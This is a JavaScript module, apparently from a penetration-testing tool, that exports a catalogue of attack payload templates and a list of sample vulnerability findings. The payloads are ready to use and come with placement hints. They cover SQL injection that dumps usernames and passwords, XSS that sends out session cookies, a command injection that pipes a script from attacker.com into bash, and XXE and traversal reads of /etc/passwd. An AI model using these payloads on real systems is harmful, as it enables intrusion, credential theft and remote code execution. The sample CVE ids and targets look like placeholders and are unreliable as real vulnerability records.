
export const payloadTemplates = {
  "sql-injection": {
    name: "SQL Injection (Bypass Auth + Dump)",
    template: `' OR 1=1;-- \n' UNION SELECT username, password FROM users;--`,
    description: "Attempts common bypass and extracts usernames/passwords. Use in login or injectable fields."
  },
  "xss-reflected": {
    name: "Reflected XSS (alert+cookie)",
    template: `<script>fetch('/?c='+document.cookie)</script>`,
    description: "Sends user cookies to a collector. Use in reflected search/forms."
  },
  "xss-stored": {
    name: "Stored XSS (stored payload)",
    template: `<img src=x onerror="fetch('/api/record?ev=xss&cookie=' + document.cookie)">`,
    description: "Attempts to store XSS in DB for later execution. Place in comment/feedback/fields that save."
  },
  "command-injection": {
    name: "Command Injection (Inject Shell)",
    template: `; curl http://attacker.com/shell.sh | bash #`,
    description: "Inject OS-level command on vulnerable input. Use in filename or device name fields on embedded systems."
  },
  "directory-traversal": {
    name: "Directory Traversal (passwd)",
    template: `../../../../../../etc/passwd`,
    description: "Access sensitive system files (Linux). Use in file path, download, or attachment fields."
  },
  "ldap-injection": {
    name: "LDAP Injection (Admin Bypass)",
    template: `*)(uid=*))(|(uid=*))(\x00`,
    description: "Attempts to bypass authentication in weak LDAP queries."
  },
  "xxe": {
    name: "XXE (File Disclosure)",
    template:
`<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>`,
    description: "Reads sensitive files via vulnerable XML parsers. Upload as XML, use in XML APIs."
  },
  "ssrf": {
    name: "SSRF (Local Access)",
    template: `http://127.0.0.1:8000/admin`,
    description: "Causes server to make requests to internal addresses. Use in imageurl/webhook fields."
  },
  "ssl-test": {
    name: "SSL/TLS Weak Cipher Command",
    template: `openssl s_client -connect TARGET:443 -cipher 'NULL-MD5'`,
    description: "Tests for acceptance of dangerously weak ciphers."
  }
};

export const advancedVulns = [
  {
    id: "CVE-2023-1234",
    title: "SQL Injection in Login Form",
    severity: "high",
    target: "192.168.1.100",
    type: "sql-injection",
    description: "Potential SQL injection vulnerability detected in authentication mechanism"
  },
  {
    id: "CVE-2023-5678",
    title: "Cross-Site Scripting (XSS)",
    severity: "medium",
    target: "web-server.local",
    type: "xss-reflected",
    description: "Reflected XSS vulnerability in search parameter"
  },
  {
    id: "CVE-2023-9012",
    title: "Weak SSL/TLS Configuration",
    severity: "low",
    target: "192.168.1.101",
    type: "ssl-test",
    description: "Server accepts weak cipher suites"
  },
  {
    id: "CVE-2023-3456",
    title: "Directory Traversal",
    severity: "high",
    target: "file-server.local",
    type: "directory-traversal",
    description: "Possible directory traversal vulnerability allowing file access"
  },
  {
    id: "CVE-2023-4321",
    title: "XML External Entity (XXE)",
    severity: "high",
    target: "api.server.app",
    type: "xxe",
    description: "XML parser vulnerability leading to file disclosure"
  },
  {
    id: "CVE-2023-4987",
    title: "SSRF Endpoint",
    severity: "critical",
    target: "api.webserver.int",
    type: "ssrf",
    description: "Server-Side Request Forgery exposes internal services"
  },
  {
    id: "CVE-2023-2999",
    title: "OS Command Injection",
    severity: "critical",
    target: "router-control-panel.local",
    type: "command-injection",
    description: "Arbitrary code execution via unsanitized user input"
  }
];

// You can add helper functions as needed
